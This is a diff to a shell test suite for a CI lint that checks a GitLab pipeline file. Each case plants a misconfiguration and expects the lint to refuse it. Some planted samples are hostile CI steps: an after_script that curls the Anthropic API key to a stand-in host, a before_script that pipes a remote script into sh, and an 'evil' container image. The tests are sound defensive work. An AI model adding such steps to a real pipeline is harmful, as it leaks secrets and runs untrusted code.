@@ -700,13 +700,39 @@ split_case "publish_docs without its environment" $ci "publish_docs has no envir
 split_case "publish_docs taking the import job's artifacts through needs" $ci "publish_docs needs must take import_docs without its artifacts" '
   y = y.replace("      artifacts: false\n", "      artifacts: true\n");'
 split_case "publish_docs on a reused build folder" $ci "publish_docs needs GIT_STRATEGY: clone" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "");'
 split_case "publish_docs on a different schedule rule" $ci "publish_docs rules must be" '
   y = y.replace("publish_docs:", "publish_docs:").replace(/(publish_docs:[\s\S]*?  rules:\n    - if: [^\n]*) && \$CI_COMMIT_BRANCH == "dev"\n/, "$1\n");'
 split_case "import_docs scheduled on main, not dev (#129)" $ci "import_docs rules must be" '
   y = y.replace(/(import_docs:[\s\S]*?  rules:\n    - if: [^\n]*) && \$CI_COMMIT_BRANCH == "dev"\n/, "$1 \&\& \$CI_COMMIT_BRANCH == \"main\"\n");'
 split_case "publish_docs running npm" $ci "publish_docs runs npm" '
   y = y.replace("    - sh tools/ci/nightly-publish.sh\n", "    - npm ci --prefix tools\n    - sh tools/ci/nightly-publish.sh\n");'
+# translate_docs holds the Anthropic API key (#125, review finding 3, and finding 4: the cap TRANSLATE_MAX_TOKENS is
+# read from the environment, so no line of .gitlab-ci.yml may set it for the job): it is judged as strictly as
+# publish_docs, which holds the import token. Each case plants one thing and the lint must name translate_docs with it.
+# (The key's name is joined in the edit: this file is read by the scan that finds the name in any other file.)
+split_case "t1: translate_docs sending the key out from an after_script" $ci "translate_docs.*after_script" '
+  const K = ["ANTHROPIC", "API", "KEY"].join("_");
+  y = y.replace("  script:\n    - sh tools/ci/nightly-translate.sh\n", () => "  script:\n    - sh tools/ci/nightly-translate.sh\n  after_script:\n    - curl -d \"$" + K + "\" https://example.invalid\n");'
+split_case "t2: translate_docs with a before_script that is not npm" $ci "translate_docs.*before_script" '
+  y = y.replace("  script:\n    - sh tools/ci/nightly-translate.sh\n", () => "  before_script:\n    - curl -sS https://example.invalid/x.sh | sh\n  script:\n    - sh tools/ci/nightly-translate.sh\n");'
+split_case "t3: translate_docs setting TRANSLATE_MAX_TOKENS in its variables" $ci "translate_docs.*variables" '
+  y = y.replace(/(translate_docs:[\s\S]*?  variables:\n    GIT_DEPTH: 1\n)/, (m) => m + "    TRANSLATE_MAX_TOKENS: \"900000000\"\n");'
+split_case "t4: translate_docs with a rule that sets variables" $ci "translate_docs.*(rules|variables)" '
+  y = y.replace(/(translate_docs:[\s\S]*?\$TRANSLATE == "true"[^\n]*\n)/, (m) => m + "      variables:\n        TRANSLATE_MAX_TOKENS: \"900000000\"\n");'
+split_case "t5: translate_docs with a key the job holding the key does not take (retry)" $ci "translate_docs.*retry|retry.*translate_docs" '
+  y = y.replace("translate_docs:\n  stage: maintenance\n", () => "translate_docs:\n  stage: maintenance\n  retry: 2\n");'
+split_case "t6: translate_docs run as a parallel matrix" $ci "translate_docs.*parallel" '
+  y = y.replace("translate_docs:\n  stage: maintenance\n", () => "translate_docs:\n  stage: maintenance\n  parallel: 2\n");'
+split_case "t7: translate_docs on a reused build folder (GIT_STRATEGY: fetch)" $ci "translate_docs.*(GIT_STRATEGY|variables)" '
+  y = y.replace(/(translate_docs:[\s\S]*?  variables:\n    GIT_DEPTH: 1\n)/, (m) => m + "    GIT_STRATEGY: fetch\n");'
+split_case "t8: TRANSLATE_MAX_TOKENS in the pipeline-wide variables" $ci "TRANSLATE_MAX_TOKENS" '
+  y = y.replace("\nvariables:\n  # The commit of the include above", () => "\nvariables:\n  TRANSLATE_MAX_TOKENS: \"900000000\"\n  # The commit of the include above");'
+# fix review 3: translate_docs has no needs, so it would take the artifacts of every earlier stage (a dotenv among them,
+# which would put variables in the job that holds the key). It must say needs: [] . The edit takes any needs line out and
+# marks the job line with a comment, so it changes the file whether the shipped job has the line or not.
+split_case "t9: translate_docs without needs: [] (it would take earlier stages' artifacts)" $ci "translate_docs.*needs" '
+  y = y.replace(/(\ntranslate_docs:\n(?:(?:  [^\n]*)?\n)*?)  needs: \[\]\n/, (m, a) => a).replace("\ntranslate_docs:\n", "\ntranslate_docs: # no needs\n");'
 split_case "the import script naming the token" tools/ci/nightly-import.sh "names the token" '
   y = y.replace("DRY_RUN=${DRY_RUN:-}\n", "DRY_RUN=${DRY_RUN:-}\ntoken=${ORBIT_SITE_IMPORT_TOKEN:-}\n");'
 split_case "the import script calling the API" tools/ci/nightly-import.sh "calls curl or git push" '
@@ -990,20 +1016,20 @@ split_case "p29: a top-level :include key" $ci "the key :include starts with a c
 split_case "p30: a :rules key in publish_docs" $ci "the key :rules starts with a colon" '
   y = y.replace("publish_docs:\n  stage: publish\n", "publish_docs:\n  :rules:\n    - when: always\n  stage: publish\n");'
 split_case "p31: a colon-led variable name" $ci "the key :FOO starts with a colon" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    :FOO: bar\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n    :FOO: bar\n");'
 # Keys that are not a plain string to both readers.
 split_case "p32: a job named yes" $ci "the key yes is not a plain string" '
   y = y + "\nyes:\n  stage: lint\n  script:\n    - \"true\"\n";'
 split_case "p33: a top-level key on" $ci "the key on is not a plain string" '
   y = y + "\non:\n  stage: lint\n  script:\n    - \"true\"\n";'
 split_case "p34: a variable named y" $ci "the key y is not a plain string" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    y: \"1\"\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n    y: \"1\"\n");'
 split_case "p35: a job named ~" $ci "the key ~ is not a plain string" '
   y = y + "\n~:\n  stage: lint\n  script:\n    - \"true\"\n";'
 split_case "p36: a job named 1" $ci "the key 1 is not a plain string" '
   y = y + "\n1:\n  stage: lint\n  script:\n    - \"true\"\n";'
 split_case "p37: a variable named null" $ci "the key null is not a plain string" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    null: \"1\"\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n    null: \"1\"\n");'
 split_case "p38: a nested key true" $ci "the key true is not a plain string" '
   y = y + "\nfine8:\n  stage: lint\n  variables:\n    true: \"1\"\n  script:\n    - \"true\"\n";'
 yaml_pass_case "p39: job names that only begin like a boolean, a null or a number pass" '
@@ -1018,7 +1044,7 @@ split_case "p42: a !ruby tag on a value" $ci "the explicit tag !ruby" '
 split_case "p43: a !!str tag on a key" $ci "the explicit tag !!str" '
   y = y + "\nfine12:\n  stage: lint\n  !!str script:\n    - \"true\"\n";'
 split_case "p44: a !!int tag on a value in publish_docs" $ci "the explicit tag !!int" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: !!int 1\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: !!int 1\n    GIT_STRATEGY: clone\n");'
 yaml_pass_case "p45: a harmless !reference passes" '
   y = y + "\n.refd:\n  script:\n    - \"true\"\n\nfine13:\n  stage: lint\n  script: [ !reference [.refd, script] ]\n";'
 # An environment name holding a %NAME% variable.
@@ -1078,7 +1104,7 @@ split_case "p65: a second global variables block holding NODE_IMAGE" $ci "NODE_I
 split_case "p66: NODE_IMAGE in the variables of a workflow rule" $ci "in workflow > rules > [0-9]+ > variables: sets NODE_IMAGE" '
   y = y.replace("    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n", "    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n      variables:\n        NODE_IMAGE: evil/node:1\n");'
 split_case "p67: NODE_IMAGE in the variables of publish_docs" $ci "in publish_docs > variables: sets NODE_IMAGE" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    NODE_IMAGE: evil/node:1\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n    NODE_IMAGE: evil/node:1\n");'
 split_case "p68: NODE_IMAGE in the variables of a parent of publish_docs" $ci "in .parent > variables: sets NODE_IMAGE" '
   y = y.replace("publish_docs:\n  stage: publish\n", "publish_docs:\n  extends: .parent\n  stage: publish\n");
   y = y + "\n.parent:\n  variables:\n    NODE_IMAGE: evil/node:1\n";'
@@ -1088,7 +1114,7 @@ split_case "p70: NODE_IMAGE in a workflow rule added as a new rule" $ci "in work
   y = y.replace("    - if: $CI_COMMIT_BRANCH\n\n.not_scheduled", "    - if: $CI_COMMIT_BRANCH\n      variables:\n        NODE_IMAGE: evil/node:1\n\n.not_scheduled");'
 # p71 (was a pass case) now refuses: round 4 item 4 allows publish_docs no variable but GIT_DEPTH and GIT_STRATEGY.
 split_case "p71: an unrelated variable in publish_docs is refused" $ci "(publish_docs.*variables|variables.*publish_docs)" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    HARMLESS: one\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n    HARMLESS: one\n");'
 # Cases p72-p84 judge item 1 of the split check (issue #60 round 3): .gitlab-ci.yml
 # may hold only tab, line feed and printable ASCII (0x20-0x7E). Any other
 # character, in a comment too, is refused with its line number (lines count line
@@ -1251,23 +1277,23 @@ split_case "p131: even an empty before_script on publish_docs is refused (round 
 # (p71 above holds the unrelated-variable case.) p133 and p134 are already refused by the
 # older GIT_STRATEGY check; they stay so that check cannot be lost.
 split_case "p133: GIT_STRATEGY: fetch in publish_docs" $ci "(publish_docs.*GIT_STRATEGY|GIT_STRATEGY.*publish_docs)" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: fetch\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: fetch\n");'
 split_case "p134: GIT_STRATEGY: none in publish_docs" $ci "(publish_docs.*GIT_STRATEGY|GIT_STRATEGY.*publish_docs)" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: none\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: none\n");'
 split_case "p135: GIT_DEPTH: 2 in publish_docs" $ci "(publish_docs.*GIT_DEPTH|GIT_DEPTH.*publish_docs)" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: 2\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: 2\n    GIT_STRATEGY: clone\n");'
 split_case "p136: GIT_DEPTH missing from publish_docs" $ci "(publish_docs.*GIT_DEPTH|GIT_DEPTH.*publish_docs)" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n");'
 split_case "p137: GIT_DEPTH written as the string \"1\" in publish_docs" $ci "(publish_docs.*GIT_DEPTH|GIT_DEPTH.*publish_docs)" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: \"1\"\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: \"1\"\n    GIT_STRATEGY: clone\n");'
 split_case "p138: a CI debug variable added to publish_docs" $ci "(publish_docs.*variables|variables.*publish_docs)" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    CI_DEBUG_TRACE: \"true\"\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n    CI_DEBUG_TRACE: \"true\"\n");'
 split_case "p139: a variable in publish_docs written in flow style" $ci "(publish_docs.*variables|variables.*publish_docs)" '
-  y = y.replace("  variables:\n    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "  variables: { GIT_DEPTH: 1, GIT_STRATEGY: clone, HARMLESS: one }\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)  variables:\n    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "  variables: { GIT_DEPTH: 1, GIT_STRATEGY: clone, HARMLESS: one }\n");'
 yaml_pass_case "p140: the same two variables in flow style on publish_docs pass" '
-  y = y.replace("  variables:\n    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "  variables: { GIT_DEPTH: 1, GIT_STRATEGY: clone }\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)  variables:\n    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "  variables: { GIT_DEPTH: 1, GIT_STRATEGY: clone }\n");'
 yaml_pass_case "p141: the two variables in the other order on publish_docs pass" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: clone\n    GIT_DEPTH: 1\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: clone\n    GIT_DEPTH: 1\n");'
 yaml_pass_case "p142: other variables on another job pass" '
   y = y + "\nfine15:\n  stage: lint\n  variables:\n    GIT_STRATEGY: none\n    HARMLESS: one\n  script:\n    - \"true\"\n";'
 # Round 5 (#60): publish_docs's own keys are an allowlist (stage, image, interruptible, needs, environment, rules,
@@ -1323,21 +1349,21 @@ split_case "p165: publish_docs interruptible: \"false\" as text" $ci "publish_do
 split_case "p166: publish_docs with its image as a mapping" $ci "publish_docs must set its own image" '
   y = y.replace("  image: $NODE_IMAGE\n  interruptible: false\n  needs:", "  image:\n    name: $NODE_IMAGE\n  interruptible: false\n  needs:");'
 split_case "p167: GIT_DEPTH: 1.0 in publish_docs" $ci "publish_docs.*GIT_DEPTH" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: 1.0\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: 1.0\n    GIT_STRATEGY: clone\n");'
 split_case "p168: GIT_DEPTH: 1. in publish_docs" $ci "publish_docs.*GIT_DEPTH" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: 1.\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: 1.\n    GIT_STRATEGY: clone\n");'
 split_case "p169: GIT_DEPTH: 1e0 in publish_docs" $ci "publish_docs.*GIT_DEPTH" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: 1e0\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: 1e0\n    GIT_STRATEGY: clone\n");'
 split_case "p170: GIT_DEPTH: 0o1 in publish_docs" $ci "publish_docs.*GIT_DEPTH" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: 0o1\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: 0o1\n    GIT_STRATEGY: clone\n");'
 split_case "p171: GIT_DEPTH: 0x1 in publish_docs" $ci "publish_docs.*GIT_DEPTH" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: 0x1\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: 0x1\n    GIT_STRATEGY: clone\n");'
 split_case "p172: GIT_DEPTH: +1 in publish_docs" $ci "publish_docs.*GIT_DEPTH" '
-  y = y.replace("    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n", "    GIT_DEPTH: +1\n    GIT_STRATEGY: clone\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_DEPTH: 1\n    GIT_STRATEGY: clone\n/, "$1" + "    GIT_DEPTH: +1\n    GIT_STRATEGY: clone\n");'
 split_case "p173: a rule of publish_docs setting a harmless variable (any rules variables, not only GIT_STRATEGY)" $ci "publish_docs has rules that set variables" '
   y = y.replace("    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"dev\"\n", "    deployment_tier: other\n  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\" && $IMPORT_DOCS == \"true\" && $CI_COMMIT_BRANCH == \"dev\"\n      variables:\n        HARMLESS: one\n");'
 yaml_pass_case "p174: GIT_STRATEGY: \"clone\" quoted in publish_docs" '
-  y = y.replace("    GIT_STRATEGY: clone\n", "    GIT_STRATEGY: \"clone\"\n");'
+  y = y.replace(/(\npublish_docs:\n(?:[ #].*\n)*?)    GIT_STRATEGY: clone\n/, "$1" + "    GIT_STRATEGY: \"clone\"\n");'
 yaml_pass_case "p175: GIT_DEPTH: 1 with a trailing comment in publish_docs" '
   y = y.replace("    GIT_DEPTH: 1\n", "    GIT_DEPTH: 1 # one clone commit\n");'
 yaml_pass_case "p176: publish_docs with its allowed keys in another order" '
@@ -1454,6 +1480,244 @@ split_pass_case() {
 }
 split_pass_case "p224: scan:trivy taking the batch-intake job_rule, the three scans carrying none" $ci "$ci_gate_js"'
   y = plant(y, "scan:trivy", ".batch-intake");'
+# Cases p225-p232 (fix review of #138, ai/agent-infra#114): the same refusal by every other route a rule list can
+# reach a snippet's job_rule: through extends (one parent, a list of parents, a chain), through !reference to a hidden
+# job's rules, through a YAML anchor on the entry or on the whole list, and through another
+# job's rules. The committed file carries no such route on the three, so each case plants the route alone. The three
+# scans' own rules block is swapped for the route; a hidden `.route_rules` job is added to carry the snippet's rule.
+route_js='
+  const swap = (y, job, repl) => y.replace(new RegExp("(\\n" + job + ":\\n(?:[ #].*\\n)*?)  rules:\\n(?: {4}.*\\n)+"), "$1" + repl);
+  const hidden = (y, body) => y + "\n.route_rules:\n" + body;
+  const top = (y, body) => ".route_rules:\n" + body + "\n" + y;
+  const CC = "    - !reference [.catchup-check, job_rule]\n", BI = "    - !reference [.batch-intake, job_rule]\n";'
+split_case "p225: scan:gitleaks taking the catchup-check job_rule by extends" $ci "scan:gitleaks.*skip the secret scan" "$route_js"'
+  y = swap(hidden(y, "  rules:\n" + CC), "scan:gitleaks", "  extends: .route_rules\n");'
+split_case "p226: private-details taking the batch-intake job_rule by extends, in a list of parents" $ci "private-details.*skip the secret scan" "$route_js"'
+  y = swap(hidden(y, "  rules:\n" + BI), "private-details", "  extends: [.not_a_parent, .route_rules]\n");'
+split_case "p227: lint taking the catchup-check job_rule by extends, two parents up" $ci "lint.*skip the secret scan" "$route_js"'
+  y = swap(hidden(y, "  rules:\n" + CC) + "\n.route_child:\n  extends: .route_rules\n", "lint", "  extends: .route_child\n");'
+split_case "p228: lint taking the catchup-check job_rule by !reference to a hidden job rules list" $ci "lint.*skip the secret scan" "$route_js"'
+  y = swap(hidden(y, "  rules:\n" + CC), "lint", "  rules:\n    - !reference [.route_rules, rules]\n    - when: on_success\n");'
+split_case "p229: private-details taking the batch-intake job_rule by !reference to a hidden job rules list" $ci "private-details.*skip the secret scan" "$route_js"'
+  y = swap(hidden(y, "  rules:\n" + BI), "private-details", "  rules:\n    - !reference [.route_rules, rules]\n    - when: on_success\n");'
+# an alias needs its anchor first, so the hidden job goes to the top of the file for the two anchor cases
+split_case "p230: private-details taking the batch-intake job_rule by a YAML anchor on the entry" $ci "private-details.*skip the secret scan" "$route_js"'
+  y = swap(top(y, "  rules:\n    - &route_rule !reference [.batch-intake, job_rule]\n"), "private-details", "  rules:\n    - *route_rule\n    - when: on_success\n");'
+split_case "p231: lint taking the catchup-check job_rule by a YAML anchor on the whole rules list" $ci "lint.*skip the secret scan" "$route_js"'
+  y = swap(top(y, "  rules: &route_list\n" + CC), "lint", "  rules: *route_list\n");'
+split_case "p232: scan:gitleaks taking the rules of scan:trivy, which carry the catchup-check job_rule, by !reference" $ci "scan:gitleaks.*skip the secret scan" "$route_js"'
+  y = swap(y, "scan:gitleaks", "  rules:\n    - !reference [scan:trivy, rules]\n");'
+# Cases p233-p242 (#141): a pipeline started from the web with TRANSLATE=true runs no browser test, no coverage
+# and no lint test (the translation does not touch the site's code), but every secret scan still runs. ci-split
+# refuses .gitlab-ci.yml when live:firefox, live:chromium, coverage, lint:test or lint:import lack the
+# `not_translation` skip (the rule entry `if: $CI_PIPELINE_SOURCE == "web" && $TRANSLATE == "true"`, `when: never`,
+# shared as the alias *not_translation or written out inline), or when lint, scan:gitleaks or private-details
+# carry it. Each case first gives the five jobs the skip where one lacks it (and adds the anchor if the file has
+# none) so it fails only for the one fault under test; the removal cases then take the skip off one job, the
+# planting cases put it on one of the three scans. A refusal names .gitlab-ci.yml, the job and "translation".
+tr_js='
+  const SKIP_IF = "if: $CI_PIPELINE_SOURCE == \"web\" && $TRANSLATE == \"true\"";
+  const FIVE = ["live:firefox", "live:chromium", "coverage", "lint:test", "lint:import"];
+  const hasSkip = (b) => /^ +- (\*not_translation|if: \$CI_PIPELINE_SOURCE == "web" && \$TRANSLATE == "true")\s*$/m.test(b);
+  const edit = (y, job, f) => {
+    const m = new RegExp("\\n" + job + ":\\n(?:[ #].*\\n)*").exec(y);
+    if (!m) throw new Error("no job " + job);
+    const b = f(m[0]);
+    if (b === m[0]) throw new Error("nothing changed in " + job);
+    return y.slice(0, m.index) + b + y.slice(m.index + m[0].length);
+  };
+  const addAnchor = (y) => {
+    if (y.includes("&not_translation")) return y;
+    const r = y.replace(/\n\.not_scheduled: &not_scheduled\n  if: .*\n  when: never\n/, (m) => m + "\n.not_translation: &not_translation\n  " + SKIP_IF + "\n  when: never\n");
+    if (r === y) throw new Error("no .not_scheduled anchor to put it beside");
+    return r;
+  };
+  const ensure = (y, job) => {
+    const m = new RegExp("\\n" + job + ":\\n(?:[ #].*\\n)*").exec(y);
+    if (m && hasSkip(m[0])) return y;
+    return edit(y, job, (b) => b.replace("    - *not_scheduled\n", "    - *not_translation\n    - *not_scheduled\n"));
+  };
+  const plant = (y, job, entry) => edit(y, job, (b) => b.replace("    - *not_scheduled\n", entry + "    - *not_scheduled\n"));
+  const strip = (y, job) => {
+    const m = new RegExp("\\n" + job + ":\\n(?:[ #].*\\n)*").exec(y);
+    if (!m) throw new Error("no job " + job);
+    const b = m[0].replace("    - *not_translation\n", "").replace("    - " + SKIP_IF + "\n      when: never\n", "");
+    if (hasSkip(b)) throw new Error("the skip is still on " + job);
+    return y.slice(0, m.index) + b + y.slice(m.index + m[0].length);
+  };
+  const without = (y, job) => { y = addAnchor(y); for (const j of FIVE) if (j !== job) y = ensure(y, j); return strip(y, job); };
+  const withFive = (y) => { y = addAnchor(y); for (const j of FIVE) y = ensure(y, j); return y; };'
+# <job> names the job whole: "lint" must not be satisfied by a refusal naming lint:test
+tr_name() { echo "((^|[^:A-Za-z_-])$1([^:A-Za-z_-]|\$).*translation|translation.*(^|[^:A-Za-z_-])$1([^:A-Za-z_-]|\$))"; }
+split_case "p233: live:firefox without the translation skip" $ci "$(tr_name 'live:firefox')" "$tr_js"'
+  y = without(y, "live:firefox");'
+split_case "p234: live:chromium without the translation skip" $ci "$(tr_name 'live:chromium')" "$tr_js"'
+  y = without(y, "live:chromium");'
+split_case "p235: coverage without the translation skip" $ci "$(tr_name 'coverage')" "$tr_js"'
+  y = without(y, "coverage");'
+split_case "p236: lint:test without the translation skip" $ci "$(tr_name 'lint:test')" "$tr_js"'
+  y = without(y, "lint:test");'
+split_case "p237: lint:import without the translation skip" $ci "$(tr_name 'lint:import')" "$tr_js"'
+  y = without(y, "lint:import");'
+split_case "p238: lint carrying the translation skip" $ci "$(tr_name 'lint')" "$tr_js"'
+  y = plant(withFive(y), "lint", "    - *not_translation\n");'
+split_case "p239: scan:gitleaks carrying the translation skip" $ci "$(tr_name 'scan:gitleaks')" "$tr_js"'
+  y = plant(withFive(y), "scan:gitleaks", "    - *not_translation\n");'
+split_case "p240: private-details carrying the translation skip" $ci "$(tr_name 'private-details')" "$tr_js"'
+  y = plant(withFive(y), "private-details", "    - *not_translation\n");'
+# the entry written out in the job (not the alias) counts as the skip too
+split_case "p241: lint carrying the translation skip written out inline" $ci "$(tr_name 'lint')" "$tr_js"'
+  y = plant(withFive(y), "lint", "    - " + SKIP_IF + "\n      when: never\n");'
+# the real file: the skip is on all five (giving it to them again changes nothing) and ci-split passes it
+has_five=0
+Y="$(cat "$ci")" JS="$tr_js"'
+  y = withFive(y);' node -e '
+  const y = process.env.Y;
+  if (new Function("y", process.env.JS + "; return y;")(y) !== y) process.exit(3);
+' || has_five=1
+lint_to_out proxy ci-split
+if [ "$rc" -eq 0 ] && [ "$has_five" -eq 0 ]; then
+  echo "ok   p242: the committed pipeline with the translation skip on all five passes"
+else
+  echo "FAIL p242: the committed pipeline with the translation skip on all five passes (exit $rc, want 0; skip missing on one of the five: $has_five)"
+  sed 's/^/     /' "$out"
+  failed=1
+fi
+# Cases p243-p246 (#143): scan:gitleaks scans only the history of the commit its pipeline is for. gitleaks' default log
+# options are `--all`, so it read every ref in the runner's git directory, other branches GitLab had fetched included; a
+# fresh clone (`GIT_STRATEGY: clone`) did not help (pipeline 3813). The command takes `--log-opts="$CI_COMMIT_SHA"` and
+# the job keeps `GIT_DEPTH: 0`. ci-split refuses .gitlab-ci.yml when the command lacks the option, passes `--all` to it,
+# or the job loses GIT_DEPTH: 0. Each case first gives the job the one it is not testing (as the #141 block gives jobs
+# their skip) so it fails only for the one fault under test; the refusal names .gitlab-ci.yml and scan:gitleaks (the job
+# may come right after "<file>: ", so the pattern needs no text before it). p243 also puts the flags in another order, so
+# its edit changes the file whether or not the committed command already has the option.
+gl_js='
+  const jobRe = /\nscan:gitleaks:\n(?:[ #].*\n)*/;
+  const edit = (y, f) => {
+    const m = jobRe.exec(y);
+    if (!m) throw new Error("no job scan:gitleaks");
+    const b = f(m[0]);
+    return y.slice(0, m.index) + b + y.slice(m.index + m[0].length);
+  };
+  const opt = "--log-opts=\"$CI_COMMIT_SHA\"";
+  const cmdRe = /^(    - gitleaks git )(.*)$/m;
+  const hasOpt = (b) => b.includes(opt);
+  const hasDepth = (b) => /^    GIT_DEPTH: 0\s*$/m.test(b);
+  const ensureOpt = (y) => edit(y, (b) => {
+    if (hasOpt(b)) return b;
+    const r = b.replace(cmdRe, (all, head, rest) => head + "--no-banner --redact --verbose " + opt + " \"$CI_PROJECT_DIR\"");
+    if (r === b) throw new Error("scan:gitleaks has no gitleaks git command to put the option on");
+    return r;
+  });
+  const ensureDepth = (y) => edit(y, (b) => {
+    if (hasDepth(b)) return b;
+    const r = b.replace("  variables:\n", "  variables:\n    GIT_DEPTH: 0\n");
+    if (r === b) throw new Error("scan:gitleaks has no variables: to put GIT_DEPTH under");
+    return r;
+  });
+  const setFlags = (y, flags) => edit(y, (b) => {
+    const r = b.replace(cmdRe, (all, head, rest) => head + flags + " \"$CI_PROJECT_DIR\"");
+    if (r === b) throw new Error("scan:gitleaks has no gitleaks git command to edit");
+    return r;
+  });
+  const stripDepth = (y) => edit(y, (b) => {
+    const r = b.replace(/^    GIT_DEPTH:.*\n/m, "");
+    if (/^    GIT_DEPTH:/m.test(r)) throw new Error("GIT_DEPTH is still on scan:gitleaks");
+    return r;
+  });
+  const withBoth = (y) => ensureDepth(ensureOpt(y));'
+# scan:gitleaks names the job whole: "scan:gitleaks" must not be satisfied by a refusal naming another job
+gl_name='(^|[^:A-Za-z_-])scan:gitleaks([^:A-Za-z_-]|$)'
+split_case "p243: scan:gitleaks without --log-opts=\"\$CI_COMMIT_SHA\"" $ci "$gl_name" "$gl_js"'
+  y = setFlags(withBoth(y), "--verbose --redact --no-banner");'
+split_case "p244: scan:gitleaks without GIT_DEPTH: 0" $ci "$gl_name" "$gl_js"'
+  y = stripDepth(withBoth(y));'
+split_case "p246: scan:gitleaks passing --all to --log-opts" $ci "$gl_name" "$gl_js"'
+  y = setFlags(withBoth(y), "--no-banner --redact --verbose --log-opts=\"--all\"");'
+# the real file: scan:gitleaks has both (giving them again changes nothing) and ci-split passes it
